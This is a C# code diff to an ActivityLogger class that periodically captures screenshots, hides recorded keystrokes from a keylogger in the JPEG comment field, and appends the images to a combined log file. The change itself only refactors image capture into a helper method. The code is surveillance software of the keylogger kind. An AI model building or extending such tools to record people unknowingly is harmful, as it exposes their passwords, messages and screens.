@@ -2,6 +2,7 @@
 using Core;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
@@ -18,6 +19,7 @@ namespace UserActivityLogger
         private readonly IKeyLogger _keyLogger;
         private readonly LogFileAppender _fileCombiner;
         private readonly KeyProcessor _keyProcesor;
+        private readonly ImageCommentEmbedder _imageCommentEmbedder;
 
         public ActivityLogger(TimeSpan fulshTimeInterval, string logFolder, IKeyLogger keyLogger)
         {
@@ -26,6 +28,7 @@ namespace UserActivityLogger
             _keyLogger = keyLogger;
             _keyProcesor = new KeyProcessor();
             _fileCombiner = new LogFileAppender(_logFolder);
+            _imageCommentEmbedder = new ImageCommentEmbedder();
         }
 
         public void StartLoging()
@@ -57,13 +60,25 @@ namespace UserActivityLogger
 
         private void AddActivityLog()
         {
-            var captureImgpath = Path.Combine(_logFolder, Guid.NewGuid().ToString() + ".jpg");
-            var img = ScreenCapture.CaptureScreen();
-            img.Save(captureImgpath, ImageFormat.Jpeg);
+            var captureImgpath = CaptureImage();
+
             new ImageCommentEmbedder().AddImageComment(captureImgpath, _keyLogger.GetKeys());
             _keyLogger.CleanBuffer();
             _fileCombiner.AppendFile(captureImgpath);
             File.Delete(captureImgpath);
+        }
+
+        private string  CaptureImage()
+        {
+            var captureImgpath = Path.Combine(_logFolder, Guid.NewGuid().ToString() + ".jpg");
+            var img = ScreenCapture.CaptureScreen();
+            img.Save(captureImgpath, ImageFormat.Jpeg);
+            return captureImgpath;
+        }
+
+        private void AddImageComments(string imagePath, string comments)
+        {
+            _imageCommentEmbedder.AddImageComment(imagePath, comments);
         }
     }
 }
